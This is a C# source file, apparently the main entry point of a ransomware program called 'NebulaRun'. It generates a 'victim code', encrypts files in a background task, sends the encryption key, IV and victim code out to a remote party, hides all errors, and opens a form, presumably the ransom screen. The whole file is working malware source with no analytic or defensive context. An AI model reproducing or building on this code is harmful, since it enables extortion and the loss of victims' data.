using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NebulaRun
{
internal static class Program
{
	[STAThread]
	private static void Main()
	{
		bool createdNew;
		using (Mutex mutex = new Mutex(true, "NB111", out createdNew))
		{
			if (!createdNew)
			{
				return;
			}

			try
			{
				AppDomain.CurrentDomain.UnhandledException += delegate(object sender, UnhandledExceptionEventArgs e)
				{
				};
				Application.ThreadException += delegate(object sender, System.Threading.ThreadExceptionEventArgs e)
				{
				};

				AppDomain.CurrentDomain.AssemblyResolve += delegate(object sender, ResolveEventArgs args)
				{
					try
					{
						string name = "NebulaRun." + new AssemblyName(args.Name).Name + ".dll";
						using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
						{
							if (stream == null)
							{
								return null;
							}
							byte[] array = new byte[stream.Length];
							stream.Read(array, 0, array.Length);
							return Assembly.Load(array);
						}
					}
					catch
					{
						return null;
					}
				};

				Nbl.GenerateVictimCode();

				Task.Run(delegate
				{
					try
					{
						Nbl.EncryptAll();
						Task.Delay(4000).Wait();
						Send.SendKeyAndIvAsync(Nbl.GetBase64Key(), Nbl.GetBase64IV(), Nbl.VictimCode).GetAwaiter().GetResult();
					}
					catch
					{
					}
				});

				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Nbl());
			}
			catch
			{
			}
		}
	}
}
}
